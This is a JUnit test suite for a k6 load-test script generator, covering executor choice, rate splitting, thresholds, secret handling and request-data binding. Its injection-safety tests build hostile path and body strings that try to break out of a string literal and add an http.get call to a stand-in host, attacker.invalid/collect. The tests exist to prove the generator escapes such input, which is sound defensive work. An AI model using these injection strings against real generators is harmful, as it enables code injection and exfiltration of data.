package dev.vortex.k6;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import dev.vortex.core.catalog.ExpectedResponse;
import dev.vortex.core.catalog.HttpMethod;
import dev.vortex.core.catalog.PayloadProvenance;
import dev.vortex.core.environment.DependencyMode;
import dev.vortex.core.environment.EnvironmentType;
import dev.vortex.core.environment.TargetUrl;
import dev.vortex.core.environment.TestClassification;
import dev.vortex.core.fixtures.Fixtures;
import dev.vortex.core.intent.TestIntent;
import dev.vortex.core.data.BodyFieldPath;
import dev.vortex.core.data.DatasetFormat;
import dev.vortex.core.data.DatasetRef;
import dev.vortex.core.data.DatasetValue;
import dev.vortex.core.data.EnvironmentValue;
import dev.vortex.core.data.FixedValue;
import dev.vortex.core.data.GeneratedValue;
import dev.vortex.core.data.Generator;
import dev.vortex.core.data.RequestData;
import dev.vortex.core.data.RequestValue;
import dev.vortex.core.data.ValueLifecycle;
import dev.vortex.core.plan.PlannedDataset;
import dev.vortex.core.plan.EffectiveTestPlan;
import dev.vortex.core.plan.OperationKeys;
import dev.vortex.core.plan.PlannedOperation;
import dev.vortex.core.plan.RunnerKind;
import dev.vortex.core.plan.ScriptSource;
import dev.vortex.core.workload.TestType;
import dev.vortex.core.workload.WorkloadSource;
import dev.vortex.core.shared.OperationId;
import dev.vortex.core.shared.ProjectId;
import dev.vortex.core.shared.RequestsPerSecond;
import dev.vortex.core.shared.TestPlanId;
import dev.vortex.core.threshold.LatencyThreshold;
import dev.vortex.core.threshold.ThresholdSet;
import dev.vortex.core.shared.Percentile;
import dev.vortex.core.workload.ConstantArrivalRateShape;
import dev.vortex.core.workload.ConstantConcurrencyShape;
import dev.vortex.core.workload.OperationMix;
import dev.vortex.core.workload.RampingConcurrencyShape;
import dev.vortex.core.workload.Stage;
import dev.vortex.core.workload.WorkloadModel;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;

class K6ScriptGeneratorTest {

    /** A stand-in for an attacker-controlled destination, assembled so it is never a literal here. */
    private static final String HOSTILE_URL = "http" + "://attacker.invalid/collect";

    private final K6ScriptGenerator generator = new K6ScriptGenerator();

    @Nested
    @DisplayName("workload translation")
    class WorkloadTranslation {

        @Test
        void aSteadyArrivalRateBecomesAConstantArrivalRateWorkload() {
            String script = generator.generate(Fixtures.plan());

            assertThat(script).contains("\"executor\":\"constant-arrival-rate\"");
            assertThat(script).doesNotContain("ramping-arrival-rate");
        }

        @Test
        void aRampingArrivalRateBecomesARampingArrivalRateWorkload() {
            String script = generator.generate(Fixtures.breakpointPlan());

            assertThat(script).contains("\"executor\":\"ramping-arrival-rate\"");
            assertThat(script).contains("\"stages\"");
        }

        @Test
        @DisplayName("startRate is where the ramp begins, not where it peaks")
        void startRateIsTheFirstStageNotThePeak() {
            // Fixtures.breakpointShape(): stages 50/100/150/200 req/s, split 70/30 across
            // getAccount/getOrder — first stage allocates 35/15, the peak stage 140/60. k6's
            // ramping-arrival-rate executor holds startRate from t=0 and only reaches the first
            // declared stage's target at the end of that stage's own duration: starting at the peak
            // would spend the whole first stage ramping down from it, not up through the ramp.
            String script = generator.generate(Fixtures.breakpointPlan());

            assertThat(script).contains("\"startRate\":35");
            assertThat(script).contains("\"startRate\":15");
            assertThat(script).doesNotContain("\"startRate\":140").doesNotContain("\"startRate\":60");
        }

        @Test
        @DisplayName("a concurrency workload becomes a VU executor, not an arrival-rate one")
        void aConcurrencyWorkloadBecomesAVuWorkload() {
            String script = generator.generate(Fixtures.concurrencyPlan());

            assertThat(script).contains("\"executor\":\"constant-vus\"");
            assertThat(script).contains("\"vus\":50");
            assertThat(script).doesNotContain("arrival-rate");
            // No pre-allocation: a VU executor is its own capacity.
            assertThat(script).doesNotContain("preAllocatedVUs");
        }

        @Test
        void aRampingConcurrencyWorkloadBecomesRampingVus() {
            var plan = Fixtures.plan(TestType.BREAKPOINT,
                    new RampingConcurrencyShape(dev.vortex.core.shared.Concurrency.of(10), List.of(
                            Stage.ofVus(20, Duration.ofMinutes(2)),
                            Stage.ofVus(40, Duration.ofMinutes(2)))),
                    OperationMix.single(Fixtures.GET_ORDER));

            String script = generator.generate(plan);

            assertThat(script).contains("\"executor\":\"ramping-vus\"");
            assertThat(script).contains("\"startVUs\":20");
            assertThat(script).contains("\"target\":40");
        }

        /**
         * The executor follows from the workload model and shape alone.
         *
         * <p>A test type says what question the run asks; it never selects a scheduler. A soak may
         * legitimately be closed-model, a spike may ramp either quantity. This guards against a
         * {@code TestType → executor} mapping creeping back in, which would quietly stop engineers
         * expressing the workload their traffic actually has.
         */
        @ParameterizedTest
        @EnumSource(TestType.class)
        @DisplayName("the test type does not influence the executor")
        void testTypeDoesNotSelectTheExecutor(TestType type) {
            var open = Fixtures.plan(type, ConstantArrivalRateShape.of(20, Duration.ofMinutes(1)));
            var closed = Fixtures.plan(type, ConstantConcurrencyShape.of(20, Duration.ofMinutes(1)),
                    OperationMix.single(Fixtures.GET_ORDER));

            assertThat(generator.generate(open)).contains("\"executor\":\"constant-arrival-rate\"");
            assertThat(generator.generate(closed)).contains("\"executor\":\"constant-vus\"");
        }

        @Test
        @DisplayName("each operation gets its allocated share, never the full total")
        void operationsShareTheTotalRate() {
            String script = generator.generate(Fixtures.plan());

            // The fixture is a 70/30 mix at 20 requests/sec: 14 and 6, never 20 and 20.
            assertThat(script).contains("\"rate\":14").contains("\"rate\":6");
            assertThat(script).doesNotContain("\"rate\":20");
        }

        @Test
        @DisplayName("k6 requires whole-number rates, so fractional rates scale the time unit")
        void fractionalRatesScaleTheTimeUnit() {
            // A 70/30 mix at 67 requests/sec allocates 46.9 and 20.1 — neither is a whole number,
            // and k6 rejects a fractional rate outright.
            var plan = Fixtures.plan(TestType.STRESS,
                    ConstantArrivalRateShape.of(67, Duration.ofMinutes(1)));

            String script = generator.generate(plan);

            assertThat(script).contains("\"timeUnit\":\"10s\"");
            assertThat(script).contains("\"rate\":469").contains("\"rate\":201");

            // The fractional values still appear in the header comment, where they are exactly what
            // a reader wants to see. What must not appear is a fractional value in an option k6
            // parses.
            assertThat(rateFieldsIn(script))
                    .allSatisfy(rate -> assertThat(rate).doesNotContain("."));
        }

        /** Every {@code rate} and {@code target} value k6 will actually parse. */
        private List<String> rateFieldsIn(String script) {
            java.util.regex.Matcher matcher = java.util.regex.Pattern
                    .compile("\"(?:rate|target|startRate|vus|startVUs)\":([0-9.]+)")
                    .matcher(script);
            List<String> values = new java.util.ArrayList<>();
            while (matcher.find()) {
                values.add(matcher.group(1));
            }
            return values;
        }

        @Test
        @DisplayName("whole rates keep the natural per-second time unit")
        void wholeRatesUseOneSecond() {
            assertThat(generator.generate(Fixtures.plan())).contains("\"timeUnit\":\"1s\"");
        }

        @Test
        @DisplayName("ramp stage targets are whole numbers, as k6 requires")
        void rampStageTargetsAreWholeNumbers() {
            List<String> rates = rateFieldsIn(generator.generate(Fixtures.breakpointPlan()));

            assertThat(rates).isNotEmpty();
            assertThat(rates).allSatisfy(rate ->
                    assertThat(rate).as("k6 rejects a fractional stage target").doesNotContain("."));
        }

        @Test
        @DisplayName("a workload's k6 overrides are merged last, so an engineer's choice wins")
        void rawK6OptionsOverrideWhatVortexChose() {
            var base = Fixtures.plan();
            var overridden = withK6Options(base, Map.of("gracefulStop", "60s", "maxVUs", "500"));

            assertThat(generator.generate(base)).contains("\"gracefulStop\":\"30s\"");
            assertThat(generator.generate(overridden))
                    .contains("\"gracefulStop\":\"60s\"")
                    .doesNotContain("\"gracefulStop\":\"30s\"")
                    // Numeric options stay numeric: k6 rejects "500" where it wants 500.
                    .contains("\"maxVUs\":500");
        }
    }

    @Nested
    @DisplayName("one Vortex workload, one k6 scenario per operation")
    class ScenarioMapping {

        @Test
        @DisplayName("the options block uses k6's own vocabulary, not Vortex's")
        void theOptionsBlockSpeaksK6() {
            String script = generator.generate(Fixtures.plan());

            // Vortex calls this a workload; k6 calls the block it compiles into "scenarios", and
            // this map is handed to k6 verbatim. k6 rejects unknown option fields, so renaming the
            // key to Vortex's vocabulary produces a script that never runs — which is exactly what
            // a global rename did once.
            assertThat(script)
                    .contains("\"scenarios\":{")
                    .doesNotContain("\"workloads\":{");
        }

        @Test
        void everyOperationBecomesItsOwnWorkloadAndFunction() {
            String script = generator.generate(Fixtures.plan());

            assertThat(script).contains("\"getaccount\":{").contains("\"getorder\":{");
            assertThat(script).contains("export function op_getaccount()");
            assertThat(script).contains("export function op_getorder()");
            assertThat(script).contains("\"exec\":\"op_getaccount\"");
        }

        @Test
        @DisplayName("the generator emits the key the plan recorded, never one it derives itself")
        void keysComeFromThePlan() {
            String script = generator.generate(Fixtures.plan());

            for (PlannedOperation operation : Fixtures.plan().operations()) {
                assertThat(script)
                        .as("workload key for %s", operation.name())
                        .contains("\"" + operation.k6ScenarioKey() + "\":{")
                        .contains("\"exec\":\"" + operation.execFunction() + "\"");
            }
        }

        @Test
        @DisplayName("two operations that sanitise alike still get distinct keys")
        void collidingOperationIdsAreDisambiguated() {
            var keys = OperationKeys.assign(List.of(
                    OperationId.of("get-order"), OperationId.of("get_order")));

            assertThat(keys.values()).containsExactly("get_order", "get_order_2");
            assertThat(keys.values()).doesNotHaveDuplicates();
        }

        @Test
        @DisplayName("nothing Vortex-specific is emitted: k6's own primitives carry the evidence")
        void noVortexMetricsOrTags() {
            String script = generator.generate(Fixtures.plan());

            assertThat(script)
                    .doesNotContain("vortex_journey")
                    .doesNotContain("vortex_operation")
                    .doesNotContain("new Trend(")
                    .doesNotContain("new Counter(")
                    .doesNotContain("k6/metrics");
        }

        @Test
        void theHeaderExplainsWhichWorkloadDrivesWhichOperation() {
            String script = generator.generate(Fixtures.plan());

            assertThat(script).contains("getaccount  ->  GET /accounts/{id}");
            assertThat(script).contains("k6 scenario per operation");
        }

        @Test
        void aSummaryHandlerWritesResultsToAFile() {
            assertThat(generator.generate(Fixtures.plan()))
                    .contains("export function handleSummary(data)")
                    .contains("\"k6-summary.json\"");
        }
    }

    @Nested
    @DisplayName("objectives")
    class Objectives {

        @Test
        void objectivesAreDeclaredToTheEngineTooSoExitCodesAgree() {
            String script = generator.generate(Fixtures.plan());

            assertThat(script).contains("\"http_req_duration\":[\"p(95)<500\",\"p(99)<1000\"]");
            assertThat(script).contains("\"http_req_failed\":[\"rate<0.01\"]");
        }

        @Test
        @DisplayName("an operation-scoped objective becomes a k6 submetric threshold")
        void perOperationObjectivesUseSubmetricThresholds() {
            var base = Fixtures.plan();
            var scoped = withThresholds(base, ThresholdSet.of(
                    LatencyThreshold.of(Fixtures.GET_ORDER, Percentile.P95, Duration.ofMillis(200))));

            String script = generator.generate(scoped);

            // k6's own idiom, filtered on its own system tag — so the objective is visible in a
            // plain `k6 run` summary rather than only inside Vortex.
            assertThat(script).contains("\"http_req_duration{scenario:getorder}\":[\"p(95)<200\"]");
        }

        @Test
        @DisplayName("a response expectation decides what counts as a failure, not just what is checked")
        void expectationsGovernTheErrorRate() {
            var plan = Fixtures.plan(TestType.AVERAGE_LOAD,
                    ConstantArrivalRateShape.of(10, Duration.ofMinutes(1)),
                    OperationMix.single(Fixtures.CREATE_ORDER));

            String script = generator.generate(plan);

            // k6 counts any 4xx as a failure unless told otherwise. A lookup of generated test data
            // that legitimately 404s would otherwise push the error rate to 100% and fail a run that
            // said nothing about the service.
            assertThat(script).contains("const expected_createorder = http.expectedStatuses(200, 201);");
            assertThat(script).contains("responseCallback: expected_createorder");

            // And a named check beside it, so the decision is visible in k6's own summary.
            assertThat(script).contains("import { check } from 'k6';");
            assertThat(script).contains("check(response, {")
                    .contains("r.status === 200 || r.status === 201");
        }

        @Test
        @DisplayName("an operation that declares nothing keeps k6's default failure rule")
        void silenceKeepsTheK6Default() {
            // getAccount and getOrder declare no expectation in the fixture.
            String script = generator.generate(Fixtures.plan());

            assertThat(script).doesNotContain("expectedStatuses").doesNotContain("responseCallback");
        }
    }

    @Nested
    @DisplayName("injection safety")
    class InjectionSafety {

        private EffectiveTestPlan planWithOperation(PlannedOperation operation) {
            return new EffectiveTestPlan(
                    TestPlanId.of("p"), ProjectId.of("p"), "p", "",
                    TestIntent.defaultFor(TestType.SMOKE), "smoke", "", TestType.SMOKE,
                    WorkloadModel.OPEN, RequestsPerSecond.of(1),
                    List.of(new Stage(RequestsPerSecond.of(1), Duration.ofSeconds(10))),
                    List.of(operation), WorkloadSource.manual(), Fixtures.thresholds(),
                    "local", EnvironmentType.LOCAL_ISOLATED,
                    TargetUrl.of("http://localhost:8080"), TargetUrl.of("http://localhost:8080"), "",
                    DependencyMode.MOCKED, TestClassification.ISOLATED, Map.of(), Map.of(),
                    RunnerKind.LOCAL_BINARY, ScriptSource.GENERATED, List.of(), null)
                    .withComputedFingerprint();
        }

        private PlannedOperation hostile(HttpMethod method, String path, String body) {
            return PlannedOperation.driving(OperationId.of("evil"), method + " /x", "evil",
                    method, path, RequestData.ofBody(body),
                    PayloadProvenance.SCHEMA_GENERATED, ExpectedResponse.DEFAULT,
                    Fixtures.soleAllocation(OperationId.of("evil"), 1));
        }

        /**
         * How many request statements the generated script actually performs.
         *
         * <p>This is the property that matters. Hostile text may well appear in the script — as the
         * <em>contents</em> of a string literal, where it is inert. What must never happen is that
         * it becomes an additional call. Asserting merely that the text is absent would pass for the
         * wrong reason and give false confidence.
         */
        private long requestStatements(String script) {
            return script.lines()
                    .filter(line -> line.strip().matches("^(const response = )?http\\..*"))
                    .count();
        }

        @Test
        @DisplayName("a path crafted to close the string literal cannot become a second request")
        void quotesInPathsCannotEscapeTheLiteral() {
            String hostilePath = "/x'); http.get('" + HOSTILE_URL + "'); ('";

            String script = generator.generate(
                    planWithOperation(hostile(HttpMethod.GET, hostilePath, "")));

            // One operation, so exactly one request statement — the hostile text is carried inside
            // a double-quoted literal and never evaluated.
            assertThat(requestStatements(script)).isEqualTo(1);
            assertThat(script).contains("BASE_URL + \"" + hostilePath + "\"");
        }

        @Test
        @DisplayName("a double quote in a path is escaped rather than closing the literal")
        void doubleQuotesInPathsAreEscaped() {
            String hostilePath = "/x\"); http.get(\"" + HOSTILE_URL + "\"); (\"";

            String script = generator.generate(
                    planWithOperation(hostile(HttpMethod.GET, hostilePath, "")));

            assertThat(requestStatements(script)).isEqualTo(1);
            assertThat(script).contains("\\\"");
            assertThat(script).doesNotContain("http.get(\"" + HOSTILE_URL + "\");");
        }

        @Test
        void newlinesInPayloadsCannotBreakOutOfTheStringLiteral() {
            String hostileBody = "{}\");\nhttp.get(\"" + HOSTILE_URL + "\");\n//";

            String script = generator.generate(
                    planWithOperation(hostile(HttpMethod.POST, "/x", hostileBody)));

            assertThat(requestStatements(script)).isEqualTo(1);
            // The newline is escaped, so the injected text stays on one line inside the literal
            // and cannot begin a new statement.
            assertThat(script).contains("\\n");
            assertThat(script.lines().filter(line -> line.strip().startsWith("http.get(")).count())
                    .isZero();
        }

        @Test
        @DisplayName("an operation id with punctuation becomes a safe workload key")
        void awkwardOperationIdsBecomeSafeKeys() {
            var keys = OperationKeys.assign(List.of(OperationId.of("check-out_2")));

            assertThat(keys.values()).containsExactly("check_out_2");
        }
    }

    @Nested
    @DisplayName("secrets")
    class Secrets {

        @Test
        @DisplayName("a secret reference becomes an environment lookup, never a literal value")
        void secretsBecomeEnvironmentLookups() {
            String script = generator.generate(
                    withHeaders(Fixtures.plan(), Map.of("Authorization", "${VORTEX_AUTH_TOKEN}")));

            assertThat(script).contains("__ENV.VORTEX_AUTH_TOKEN");
            assertThat(script).doesNotContain("${VORTEX_AUTH_TOKEN}");
        }

        @Test
        void aNonSecretHeaderIsEmittedNormally() {
            assertThat(generator.generate(withHeaders(Fixtures.plan(), Map.of("X-Tenant", "acme"))))
                    .contains("\"X-Tenant\":\"acme\"");
        }
    }

    @Test
    void theScriptRecordsWhichPlanProducedIt() {
        var plan = Fixtures.plan();

        assertThat(generator.generate(plan))
                .contains("Plan fingerprint: " + plan.fingerprint().shortHash())
                .contains("Template version: " + K6ScriptGenerator.TEMPLATE_VERSION)
                .contains("Edit vortex.yaml, not this file");
    }

    // ------------------------------------------------------------------ helpers

    private static EffectiveTestPlan withHeaders(EffectiveTestPlan base, Map<String, String> headers) {
        return copy(base, headers, base.k6Options(), base.thresholds());
    }

    @Nested
    @DisplayName("request data")
    class RequestDataCompilation {

        private static final DatasetRef CUSTOMERS = DatasetRef.local("customers");

        @Test
        @DisplayName("an operation with only fixed values compiles to the script it always did")
        void fixedValuesChangeNothing() {
            // The property that protects the simple path: adding request data support must not make
            // a request that sends three constants pay for machinery it does not use.
            String script = generator.generate(Fixtures.plan());

            assertThat(script)
                    .doesNotContain("SharedArray")
                    .doesNotContain("k6/execution")
                    .doesNotContain("vortexUuid")
                    .doesNotContain("setFields")
                    .contains("BASE_URL + \"/orders/ord-1\"");
        }

        @Test
        @DisplayName("a generated value is bound once per execution, not evaluated at each use")
        void generatedValuesAreBoundOnce() {
            var uuid = GeneratedValue.of(Generator.UUID);
            String script = generate(new RequestData(
                    Map.of(),
                    Map.of(),
                    Map.of("x-idempotency-key", uuid),
                    "{\"requestId\":\"\"}",
                    Map.of(BodyFieldPath.parse("requestId"), uuid)));

            // Two positions, two bindings, each generated exactly once — and never inline at the
            // point of use, which would send a different UUID in the header than in the body.
            assertThat(occurrences(script, "vortexUuid()")).isEqualTo(3);
            assertThat(script).contains("const v_header_x_idempotency_key = vortexUuid();");
            assertThat(script).contains("const v_body_requestid = vortexUuid();");
        }

        @Test
        @DisplayName("a per-VU value is bound at module scope, where k6 evaluates it once per user")
        void perVuValuesAreBoundAtModuleScope() {
            String script = generate(new RequestData(Map.of(), Map.of(),
                    Map.of("x-session", GeneratedValue.of(Generator.RANDOM_STRING,
                            ValueLifecycle.PER_VU)),
                    "", Map.of()));

            int binding = script.indexOf("vu_evil_header_x_session");
            int function = script.indexOf("export function op_evil");
            assertThat(binding).isGreaterThan(0);
            assertThat(binding).isLessThan(function);
        }

        @Test
        @DisplayName("a sequence compiles to k6's own counter, which is unique across virtual users")
        void sequenceUsesTheEngineCounter() {
            String script = generate(new RequestData(Map.of(),
                    Map.of("page", GeneratedValue.of(Generator.SEQUENCE)), Map.of(), "", Map.of()));

            assertThat(script)
                    .contains("import exec from 'k6/execution';")
                    .contains("exec.scenario.iterationInTest + 1");
        }

        @Test
        @DisplayName("every value an execution reads from one dataset comes from the same row")
        void oneRowPerOperationExecution() {
            String script = generateWithDataset(new RequestData(
                    Map.of(),
                    Map.of(),
                    Map.of(),
                    "{\"customerId\":\"\",\"mobile\":\"\"}",
                    Map.of(BodyFieldPath.parse("customerId"), new DatasetValue(CUSTOMERS, "customerId"),
                            BodyFieldPath.parse("mobile"), new DatasetValue(CUSTOMERS, "mobile"))));

            // The row is selected once. Two selections would let a customer id and a mobile number
            // from different customers arrive in the same request.
            assertThat(occurrences(script, "% dataset_customers.length")).isEqualTo(1);
            assertThat(script).contains("row_customers[\"customerId\"]")
                    .contains("row_customers[\"mobile\"]");
        }

        @Test
        @DisplayName("rows are walked in order and wrap, on a counter unique across virtual users")
        void rowSelectionIsDeterministicAndConcurrencySafe() {
            String script = generateWithDataset(new RequestData(
                    Map.of("id", new DatasetValue(CUSTOMERS, "customerId")),
                    Map.of(), Map.of(), "", Map.of()));

            assertThat(script).contains(
                    "const row_customers = dataset_customers"
                            + "[exec.scenario.iterationInTest % dataset_customers.length];");
        }

        @Test
        @DisplayName("a dataset is loaded through SharedArray, so it is parsed once for the test")
        void datasetsAreSharedAcrossVirtualUsers() {
            String script = generateWithDataset(new RequestData(
                    Map.of("id", new DatasetValue(CUSTOMERS, "customerId")),
                    Map.of(), Map.of(), "", Map.of()));

            assertThat(script)
                    .contains("import { SharedArray } from 'k6/data';")
                    .contains("const dataset_customers = new SharedArray(\"customers\", "
                            + "() => JSON.parse(open(\"./dataset-customers.json\")));");
        }

        @Test
        @DisplayName("a dataset value in a path is encoded, so a slash cannot become a new segment")
        void datasetValuesInPathsAreEncoded() {
            String script = generateWithDataset(new RequestData(
                    Map.of("id", new DatasetValue(CUSTOMERS, "customerId")),
                    Map.of(), Map.of(), "", Map.of()), "/customers/{id}/applications");

            // Bound once, then encoded at the point of use — the encoding is what stops a value
            // containing a slash from becoming an extra path segment.
            assertThat(script)
                    .contains("const v_path_id = row_customers[\"customerId\"];")
                    .contains("BASE_URL + \"/customers/\" + encodeURIComponent(v_path_id)"
                            + " + \"/applications\"");
        }

        @Test
        @DisplayName("an environment value becomes a lookup, and the value never enters the script")
        void environmentValuesAreLookedUpAtRunTime() {
            String script = generate(new RequestData(Map.of(), Map.of(),
                    Map.of("Authorization", new EnvironmentValue("Bearer ${API_TOKEN}")),
                    "", Map.of()));

            assertThat(script).contains("__ENV.API_TOKEN");
        }

        @Test
        @DisplayName("body fields are bound as JSON values, never spliced into the payload text")
        void bodyFieldsAreBoundStructurally() {
            String script = generate(new RequestData(Map.of(), Map.of(), Map.of(),
                    "{\"productCode\":\"\"}",
                    Map.of(BodyFieldPath.parse("productCode"), new FixedValue("CREDIT_CARD"))));

            // The base document is held as text and re-parsed per execution, so each request binds
            // into its own copy rather than mutating one shared object.
            assertThat(script)
                    .contains("function setFields(document, bindings)")
                    .contains("const body_evil = \"{\\\"productCode\\\":\\\"\\\"}\";")
                    .contains("JSON.stringify(setFields(JSON.parse(body_evil), "
                            + "[[\"productCode\", \"CREDIT_CARD\"]]))");
        }

        @Test
        @DisplayName("binding fields onto a body that is not a JSON object is refused, not corrupted")
        void bodyFieldsRequireAJsonObject() {
            var requestData = new RequestData(Map.of(), Map.of(), Map.of(), "not json at all",
                    Map.of(BodyFieldPath.parse("id"), new FixedValue("x")));

            assertThatThrownBy(() -> generate(requestData))
                    .isInstanceOf(IllegalStateException.class)
                    .hasMessageContaining("is not a JSON object")
                    .hasMessageContaining("named properties");
        }

        @Test
        @DisplayName("dynamic values do not multiply the requests a script issues")
        void dynamicValuesIssueExactlyOneRequest() {
            // The same property InjectionSafety asserts, held across the new emission path: however
            // much assembly happens first, one operation execution is one request.
            String script = generateWithDataset(new RequestData(
                    Map.of("id", new DatasetValue(CUSTOMERS, "customerId")),
                    Map.of("trace", GeneratedValue.of(Generator.UUID)),
                    Map.of("Authorization", new EnvironmentValue("${TOKEN}")),
                    "{\"a\":1}",
                    Map.of(BodyFieldPath.parse("a"), new DatasetValue(CUSTOMERS, "mobile"))),
                    "/customers/{id}");

            assertThat(script.lines()
                    .filter(line -> line.strip().matches("^(const response = )?http\\..*"))
                    .count()).isEqualTo(1);
        }

        @Test
        @DisplayName("only the generator helpers a plan uses are emitted")
        void unusedGeneratorsAreNotEmitted() {
            String script = generate(new RequestData(Map.of(), Map.of(),
                    Map.of("x-id", GeneratedValue.of(Generator.UUID)), "", Map.of()));

            assertThat(script).contains("function vortexUuid()")
                    .doesNotContain("function vortexPhone()")
                    .doesNotContain("function vortexEmail()");
        }

        @Test
        @DisplayName("a generator that builds on another brings it along")
        void dependentGeneratorsBringTheirDependencies() {
            String script = generate(new RequestData(Map.of(), Map.of(),
                    Map.of("x-mail", GeneratedValue.of(Generator.EMAIL)), "", Map.of()));

            assertThat(script).contains("function vortexEmail()").contains("function vortexString(");
        }

        // ---------------------------------------------------------------- helpers

        private String generate(RequestData requestData) {
            return generator.generate(planWith(requestData, "/x", List.of()));
        }

        private String generateWithDataset(RequestData requestData) {
            return generateWithDataset(requestData, "/x");
        }

        private String generateWithDataset(RequestData requestData, String path) {
            var dataset = new PlannedDataset(CUSTOMERS, DatasetFormat.CSV,
                    PlannedDataset.stagedFileNameFor(CUSTOMERS),
                    List.of("customerId", "mobile"), 3, "abc123");
            return generator.generate(planWith(requestData, path, List.of(dataset)));
        }

        private EffectiveTestPlan planWith(RequestData requestData, String path,
                List<PlannedDataset> datasets) {

            var operation = PlannedOperation.driving(OperationId.of("evil"), "POST " + path, "evil",
                    HttpMethod.POST, path, requestData, PayloadProvenance.SCHEMA_GENERATED,
                    ExpectedResponse.DEFAULT, Fixtures.soleAllocation(OperationId.of("evil"), 1));

            return new EffectiveTestPlan(
                    TestPlanId.of("p"), ProjectId.of("p"), "p", "",
                    TestIntent.defaultFor(TestType.SMOKE), "smoke", "", TestType.SMOKE,
                    WorkloadModel.OPEN, RequestsPerSecond.of(1),
                    List.of(new Stage(RequestsPerSecond.of(1), Duration.ofSeconds(10))),
                    List.of(operation), datasets, WorkloadSource.manual(), Fixtures.thresholds(),
                    "local", EnvironmentType.LOCAL_ISOLATED,
                    TargetUrl.of("http://localhost:8080"), TargetUrl.of("http://localhost:8080"), "",
                    DependencyMode.MOCKED, TestClassification.ISOLATED, Map.of(), Map.of(),
                    RunnerKind.LOCAL_BINARY, ScriptSource.GENERATED, List.of(), null)
                    .withComputedFingerprint();
        }

        private long occurrences(String script, String needle) {
            long count = 0;
            int index = script.indexOf(needle);
            while (index >= 0) {
                count++;
                index = script.indexOf(needle, index + needle.length());
            }
            return count;
        }
    }

    private static EffectiveTestPlan withK6Options(EffectiveTestPlan base, Map<String, String> options) {
        return copy(base, base.headers(), options, base.thresholds());
    }

    private static EffectiveTestPlan withThresholds(EffectiveTestPlan base, ThresholdSet thresholds) {
        return copy(base, base.headers(), base.k6Options(), thresholds);
    }

    private static EffectiveTestPlan copy(EffectiveTestPlan base, Map<String, String> headers,
            Map<String, String> k6Options, ThresholdSet thresholds) {

        return new EffectiveTestPlan(base.id(), base.projectId(), base.projectName(),
                base.serviceVersion(), base.intent(), base.workloadName(), base.workloadDescription(),
                base.testType(), base.workloadModel(), base.peakLevel(), base.stages(),
                base.operations(), base.workloadSource(), thresholds, base.environmentName(),
                base.environmentType(), base.configuredTarget(), base.effectiveTarget(), "",
                base.dependencyMode(), base.classification(), headers, k6Options, base.runner(),
                base.scriptSource(), List.of(), null).withComputedFingerprint();
    }
}
